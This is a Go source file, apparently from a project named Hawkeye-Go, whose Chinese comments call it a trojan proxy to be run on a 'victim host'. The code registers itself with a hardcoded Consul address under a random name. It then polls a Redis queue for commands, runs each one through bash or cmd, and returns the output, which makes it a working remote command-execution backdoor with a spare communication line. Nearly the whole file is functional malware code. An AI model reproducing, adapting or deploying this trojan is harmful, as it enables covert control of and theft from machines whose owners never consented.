// cerate proxy service on victim host.
// @method: jstang
// @date: 2020/12/25
// @desc: 木马代理, Poc注入时在metadata中注入信息
// @example: go run micro/trojan/main.go --server_metadata id=5fb8e3dc11109ffb5e8cdc3e --server_metadata mq=127.0.0.1:6379 --server_name 5fb8e3dc11109ffb5e8cdc3e --registry_address 172.31.50.249:8500
package main

import (
	"bytes"
	"fmt"
	"log"
	"math/rand"
	"os/exec"
	"time"

	"github.com/garyburd/redigo/redis"
	"github.com/wh1t3zer/Hawkeye-Go/micro/handler"
	"github.com/wh1t3zer/Hawkeye-Go/micro/proto/rpcapi"
	"github.com/micro/go-micro"
	"github.com/micro/go-micro/registry"
	"github.com/micro/go-plugins/registry/consul"
)

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

// RandomStr 随机字符串
func RandomStr(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// Proxy ...
type Proxy struct {
	Gmq       string
	Rmq       string
	RedisAddr string
}

func initProxy(assetID, addr string) *Proxy {
	if assetID == "" || addr == "" {
		return nil
	}
	return &Proxy{
		Gmq:       fmt.Sprintf("g%s", assetID),
		Rmq:       fmt.Sprintf("r%s", assetID),
		RedisAddr: addr,
	}
}

// Run ...
func (p *Proxy) Run() {
	redisConn, err := redis.Dial("tcp", p.RedisAddr)
	if err != nil {
		fmt.Printf("Failed Connect Redis. info: %v\n", err)
		return
	}
	// 把原管道的数据给清空
	for {
		if _, err := redis.String(redisConn.Do("lpop", p.Gmq)); err != nil {
			break
		}
	}

	// 持续接收消息
	for {
		ele, err := redis.String(redisConn.Do("lpop", p.Gmq))
		if err != nil {
			// fmt.Println("(run)no msg.sleep now")
			time.Sleep(time.Second * 2)
			continue
		}
		// 执行返回消息
		fmt.Println("(mq message): recv data:", ele)
		if _, err := redisConn.Do("rpush", p.Rmq, p.execMsg(ele)); err != nil {
			fmt.Printf("推送至结果队列出错, info: %v\n", err)
		}
	}
}

func (p *Proxy) execMsg(msg string) string {
	linux := exec.Command("/bin/bash", "-c", msg)
	var lout bytes.Buffer // 读取io.Writer类型的cmd.Stdout，再通过bytes.Buffer(缓冲byte类型的缓冲器)将 \
	linux.Stdout = &lout  // byte类型转化为string类型(out.String():这是bytes类型提供的接口)
	//Run执行c包含的命令，并阻塞直到完成。  这里stdout被取出，cmd.Wait()无法正确获取stdin,stdout,stderr，则阻塞在那了
	if err := linux.Run(); err == nil {
		return lout.String()
	}

	win := exec.Command("cmd", msg)
	var wout bytes.Buffer
	win.Stdout = &wout
	if err := win.Run(); err != nil {
		return fmt.Sprintf("Failed exec command, info: %v", err)
	}
	return wout.String()
}

// go run main.go --registry_address 172.31.50.249:8500
func main() {
	microName := RandomStr(24) + ".undefined"

	reg := consul.NewRegistry(registry.Addrs("172.31.50.249:8500"))
	service := micro.NewService(micro.Name(microName), micro.Registry(reg))
	service.Init()
	fmt.Printf("%v - %v - %v - %v\n", service.Name(), service.Options(), service.String(), service.Server().Options().Metadata)
	// 1. 尝试启动备用线路2(穿透线路通信)
	metadata := service.Server().Options().Metadata
	if bak2 := initProxy(metadata["id"], metadata["mq"]); bak2 != nil {
		log.Printf("Success Open Spare-Line.")
		go bak2.Run()
	}
	// 2. 启动主线路(木马服务发现及注册, 直通线路通信)
	rpcapi.RegisterVictimHandler(service.Server(), new(handler.Victim))
	if err := service.Run(); err != nil {
		panic(err)
	}
}

func main2() {
	obj := initProxy("5fb8e3dc11109ffb5e8cdc3e", "172.31.5049:6379")
	if obj == nil {
		fmt.Printf("Failed Get redis_address.\n")
		return
	}
	fmt.Println(obj)
	// 1. 消费结果消息
	// go obj.result()
	// // 2. 持续请求
	// go obj.enter()
	// // 3.运行core
	// obj.Run()
}

// 测试手动输入数据
func (p *Proxy) enter() {
	redisConn, err := redis.Dial("tcp", p.RedisAddr)
	if err != nil {
		fmt.Printf("Faled enter msg to redis, info: %v\n", err)
		return
	}
	for {
		if _, err := redisConn.Do("rpush", p.Gmq, "pwd"); err != nil {
			fmt.Printf("推送至请求队列出错, info: %v\n", err)
		} else {
			fmt.Printf("推送至请求队列, data: %v\n", "pwd")
		}
		time.Sleep(time.Second * 2)
	}
}

// 测试手动查看结果
func (p *Proxy) result() {
	redisConn, err := redis.Dial("tcp", p.RedisAddr)
	if err != nil {
		fmt.Printf("Faled connect redis, info: %v\n", err)
		return
	}
	for {
		ele, err := redis.String(redisConn.Do("lpop", p.Rmq))
		if err != nil {
			fmt.Println("(result)no msg.sleep now")
			time.Sleep(time.Second * 2)
		} else {
			fmt.Printf("cosume element:%s\n", ele)
		}
	}
}
